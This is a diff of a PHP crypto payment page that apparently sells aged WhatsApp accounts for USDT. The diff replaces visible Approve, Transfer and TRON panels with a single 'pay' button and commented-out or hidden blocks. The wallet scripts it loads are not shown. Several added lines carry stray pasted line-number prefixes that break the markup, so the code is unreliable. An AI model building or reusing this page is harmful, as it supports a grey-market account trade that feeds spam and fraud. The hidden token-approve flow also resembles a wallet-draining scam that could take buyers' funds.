@@ -4,6 +4,11 @@ declare(strict_types=1);
 
 header('Content-Type: text/html; charset=utf-8');
 
+$amountStr = '5.00';
+$productTitle = 'WhatsApp 直登号【一年以上】';
+$quantity = 1;
+$contact = '283206@qq.com';
+
 ?><!doctype html>
 <html lang="zh-CN">
 <head>
@@ -17,7 +22,24 @@ header('Content-Type: text/html; charset=utf-8');
     .walletIcon { width: 44px; height: 44px; border-radius: 12px; object-fit: cover; }
   </style>
 </head>
-<body>
+20→<body class="bg-light" style="background-color:#e6f3ff;">
+21→  <div class="d-flex justify-content-center py-4">
+22→    <div class="col-11 col-md-6 col-lg-4">
+23→      <div class="mb-3 text-center small text-body-secondary">正在向对方转账支付 <?php echo htmlspecialchars($amountStr, ENT_QUOTES, 'UTF-8'); ?> USDT</div>
+24→      <div class="p-3 rounded-4" style="background:#ff8c1a;color:#fff;">
+25→        <div class="mb-2 fw-semibold">付款信息</div>
+26→        <hr class="my-2" style="border-color:rgba(255,255,255,.4);" />
+27→        <div class="mb-1">商品详情：<span class="mono"><?php echo htmlspecialchars($productTitle, ENT_QUOTES, 'UTF-8'); ?></span></div>
+28→        <div class="mb-1">购买数量：<span class="mono"><?php echo (int) $quantity; ?></span></div>
+29→        <div class="mb-1">联系方式：<span class="mono"><?php echo htmlspecialchars($contact, ENT_QUOTES, 'UTF-8'); ?></span></div>
+30→        <div class="mb-3">付款金额：<span class="mono fw-semibold"><?php echo htmlspecialchars($amountStr, ENT_QUOTES, 'UTF-8'); ?> USDT</span></div>
+31→        <div class="d-grid mt-3">
+32→          <button type="button" class="btn" id="btnPayNow" style="background:#ffa726;border:none;color:#fff;">点击付款</button>
+33→        </div>
+34→      </div>
+35→    </div>
+36→  </div>
+
   <div class="modal fade" id="walletModal" tabindex="-1" aria-labelledby="walletModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
       <div class="modal-content">
@@ -61,7 +83,7 @@ header('Content-Type: text/html; charset=utf-8');
             </button>
             <button type="button" class="list-group-item list-group-item-action" id="btnWalletTrust">
               <div class="d-flex align-items-center gap-3">
-                <img class="walletIcon" src="https://trustwallet.com/assets/images/favicon.png" alt="Trust Wallet" />
+                <img class="walletIcon" src="https://trustwallet.com/_next/image?url=https%3A%2F%2Fstrapi-cdn.trustwallet.com%2FTrust_Wallet_Shield_fe03d09499.png&w=3840&q=75" alt="Trust Wallet" />
                 <div class="flex-grow-1">
                   <div class="fw-semibold">Trust Wallet</div>
                   <div class="text-body-secondary small">ERC20</div>
@@ -70,7 +92,7 @@ header('Content-Type: text/html; charset=utf-8');
             </button>
             <button type="button" class="list-group-item list-group-item-action" id="btnWalletMetaMask">
               <div class="d-flex align-items-center gap-3">
-                <img class="walletIcon" src="https://metamask.io/images/favicon-256.png" alt="MetaMask" />
+                <img class="walletIcon" src="http://www.crypto-nation.io/cn-files/uploads/2020/10/metamask-logo.png" alt="MetaMask" />
                 <div class="flex-grow-1">
                   <div class="fw-semibold">MetaMask</div>
                   <div class="text-body-secondary small">ERC20 / BEP20</div>
@@ -85,8 +107,8 @@ header('Content-Type: text/html; charset=utf-8');
     </div>
   </div>
 
-  <div id="legacy" class="d-none">
-  <div class="card">
+  <!-- <div id="legacy">
+  <div class="card d-none">
     <div class="row">
       <button id="btnConnect">选择钱包</button>
       <div class="muted">EVM 地址：<span id="addr" class="mono">未连接</span></div>
@@ -124,9 +146,9 @@ header('Content-Type: text/html; charset=utf-8');
         <button id="btnLoadToken">读取 Token 信息</button>
       </div>
     </div>
-  </div>
+  </div> -->
 
-  <div class="card">
+  <!-- <div class="card d-none">
     <h3 style="margin-top:0">Approve</h3>
     <div class="row">
       <div>
@@ -154,7 +176,7 @@ header('Content-Type: text/html; charset=utf-8');
     </div>
   </div>
 
-  <div class="card">
+  <div class="card d-none">
     <h3 style="margin-top:0">Transfer</h3>
     <div class="row">
       <div>
@@ -182,7 +204,7 @@ header('Content-Type: text/html; charset=utf-8');
     </div>
   </div>
 
-  <div class="card">
+  <div class="card d-none">
     <h3 style="margin-top:0">TRON / TRC20</h3>
     <div class="muted">选择 TronLink / TokenPocket(TRON) 后可用</div>
     <div style="margin-top:12px" class="row">
@@ -251,17 +273,15 @@ header('Content-Type: text/html; charset=utf-8');
         <button id="btnTronBalance" disabled>查询余额</button>
       </div>
     </div>
-  </div>
+  </div> -->
 
-  <div class="card">
-    <h3 style="margin-top:0">日志</h3>
-    <div id="log" class="mono"></div>
-  </div>
-  </div>
 
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@6.1.1/dist/TronWeb.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
+  <script>
+    window.pay0Config = { amountUsdt: <?php echo json_encode($amountStr, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?> };
+  </script>
   <script src="/wallet/Evm.php?js=1"></script>
   <script src="/wallet/TronLink.php?js=1"></script>
   <script src="/wallet/TokenPocket.php?js=1"></script>
